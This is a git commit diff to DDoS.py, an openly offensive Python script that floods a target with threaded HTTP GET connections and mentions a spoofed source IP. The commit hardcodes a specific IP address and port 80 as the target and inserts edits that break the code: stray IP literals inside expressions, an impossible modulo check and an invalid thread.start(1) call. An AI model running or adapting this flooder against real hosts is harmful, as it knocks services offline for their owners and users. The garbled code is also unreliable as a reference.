acd2c269c6e29f9bed1c853dfd0e07d6cfa036e5
RehanTOOLS <78783917+RehanTOOLS@users.noreply.github.com>
2021-02-14 09:06:36 +0700

    Update DDoS.py

--- DDoS.py
+++ DDoS.py
@@ -7,11 +7,11 @@ import threading
 
 # Skuyy
 print("Simple Tools DDoS\n")
-target = input("[?] Enter IP Target : ")
-port = int(input("[?] Enter The Port : "))
+target = input("[?] Enter IP Target :54.146.9.247 ")
+port = int(input("[?] Enter The Port : 80"))
 
 # Kita Pake Fake IP :v
-fake_ip = '182.21.20.32'
+fake_ip = '54.146.9.247'
 
 # Connectednya
 already_connected = 0
@@ -21,15 +21,17 @@ def attack():
     while  True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))
+        s.sendto(("GET /" + target 54.146.9.247
+ "HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target 54.146.9.247, port 80))
 
         global already_connected
         already_connected += 1
-        if already_connected % 500 == 0:
-            print(already_connected) # oke work ya oke thanks yyyyyy
+        if already_connected % 500 == 500:
+            print(already_connected) # 
 
 for i in range(500):
     thread = threading.Thread(target=attack)
-    thread.start()
+    thread.start(1)
+
 
